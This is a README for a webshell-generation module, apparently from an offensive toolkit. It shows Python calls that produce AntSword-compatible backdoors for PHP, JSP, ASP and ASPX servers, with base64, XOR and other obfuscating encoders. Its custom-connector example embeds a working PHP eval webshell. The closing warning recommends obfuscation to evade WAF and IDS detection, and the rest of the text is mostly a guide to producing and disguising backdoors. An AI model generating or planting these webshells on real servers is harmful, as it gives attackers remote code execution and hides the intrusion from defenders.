# Webshell Generation

Generate AntSword-compatible webshells using multiple methods: built-in templates, remote APIs, or custom connectors.

## Directory Structure

```
webshell/
├── connectors/          # Connector implementations
│   ├── template.py      # Built-in: template-based generator
│   ├── remote.py        # Built-in: HTTP API and file-based
│   ├── your_*.py        # Your custom connectors (auto-discovered)
│   └── README.md        # Connector development guide
├── generators/          # Legacy language-specific generators
└── templates.py         # Built-in webshell templates
```

## Quick Usage

### Basic (Template)

```python
from ofx.api.webshell import generate_webshell

# PHP webshell
shell = generate_webshell('php', password='x', encoder='base64')

# JSP webshell with auth
shell = generate_webshell(
    'jsp',
    password='cmd',
    secret_header='X-Auth-Token',
    secret_value='secret123',
    inline=True
)
```

### Specific Connector

```python
# Use template connector explicitly
shell = generate_webshell('php', password='x', connector_name='template')
```

### Remote HTTP API

```python
from ofx.api.webshell import get_registry
from ofx.data.webshell.connectors.remote import RemoteHTTPConnector

http = RemoteHTTPConnector(
    base_url='https://webshell-api.example.com',
    api_key='your-api-key'
)
get_registry().register_connector_instance(http)

shell = generate_webshell('php', password='x', connector_name=http.name)
```

### File-Based Templates

```python
from ofx.data.webshell.connectors.remote import FileConnector

file = FileConnector(template_dir='/opt/custom-webshells')
get_registry().register_connector_instance(file)

shell = generate_webshell('php', password='x', connector_name=file.name)
```

## Extending

### Create Custom Connector

1. **Create file:** `connectors/my_generator.py`
2. **Implement:**
```python
from ofx.data.webshell.connectors.base import WebshellConnector

class MyGeneratorConnector(WebshellConnector):
    def __init__(self):
        super().__init__(name="mygen", description="My generator")
    
    def generate(self, language, password="pass", encoder="default", **kwargs):
        if language == 'php':
            return f"<?php eval($_POST['{password}']); ?>"
        raise ValueError(f"Unsupported: {language}")
    
    def _check_availability(self):
        return True  # Always available
```

3. **Use:**
```python
from ofx.api.webshell import generate_webshell

# Auto-discovered
shell = generate_webshell('php', password='x', connector_name='mygen')
```

See [connectors/README.md](connectors/README.md) for detailed guide.

## Supported Languages

- **PHP**: default, base64, chr, assert, create_function, callback, one_liner
- **JSP**: default, base64, script_engine
- **ASP**: default, eval
- **ASPX**: default, base64, jscript

## Advanced Usage

### List Available Connectors

```python
from ofx.api.webshell import get_available_connectors

for connector in get_available_connectors():
    print(f"{connector.name}: {connector.description}")
    print(f"  Languages: {connector.get_supported_languages()}")
```

### Custom Parameters

```python
# Pass custom parameters to connectors
shell = generate_webshell(
    'php',
    password='x',
    connector_name='custom',
    custom_params={
        'obfuscation': 'high',
        'encoding': 'xor',
    }
)
```

### Using WebShell Classes

```python
from ofx.api.webshell import PhpShell

shell = PhpShell(password='x', encoder='base64')
code = shell.get_webshell(inline=True)
```

## Troubleshooting

**Connector not found:**
- Check available connectors: `get_available_connectors()`
- Verify connector file in `connectors/` directory
- Check logs for discovery errors

**Language not supported:**
- Check supported languages: `connector.get_supported_languages()`
- Verify encoder: `connector.get_supported_encoders(language)`

**Template errors:**
- Ensure template files exist in correct location
- Verify template syntax and placeholders

## Resources

- **AntSword**: https://github.com/AntSwordProject/antSword
- **Webshell Detection**: YARA rules, behavior analysis
- **PHP Security**: https://www.php.net/manual/en/security.php

---

⚠️ **Security Warning:** Only use in authorized testing environments. Webshells may be detected by WAF/IDS. Consider obfuscation and encoding for evasion.
